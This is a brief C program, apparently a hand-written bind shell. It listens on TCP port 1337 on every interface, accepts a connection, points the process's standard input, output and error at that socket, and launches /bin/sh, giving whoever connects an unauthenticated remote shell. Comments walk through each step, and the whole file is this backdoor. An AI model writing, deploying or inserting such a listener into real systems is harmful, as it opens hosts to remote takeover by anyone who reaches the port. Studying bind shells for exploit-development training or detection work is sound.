#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>


int main(int argc, char **argv) {

    int listenfd, connfd;
    socklen_t len;
    struct sockaddr_in serveraddr, cliaddr;

    // Create a listen file descriptor
    listenfd = socket(AF_INET, SOCK_STREAM, 0);

    // Configure our server
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
    serveraddr.sin_port = htons(1337);

    // Bind the configured socket to our listendfd file descriptor
    bind(listenfd, (struct sockaddr*) &serveraddr, sizeof(serveraddr));

    // Listen on port 1337 on any address
    listen(listenfd, 2);

    // Block until connection is made
    connfd = accept(listenfd, NULL, NULL);

    // Point the file descriptors STDIN,STDOUT,STDERR
    // to the new file descriptor created for the new connection
    dup2(connfd, 0);
    dup2(connfd, 1);
    dup2(connfd, 2);

    // Execute local program /bin/sh
    execv("/bin/sh", NULL, NULL);

    // Close file descriptors
    close(connfd);
    close(listenfd);
    
    return 0;
}
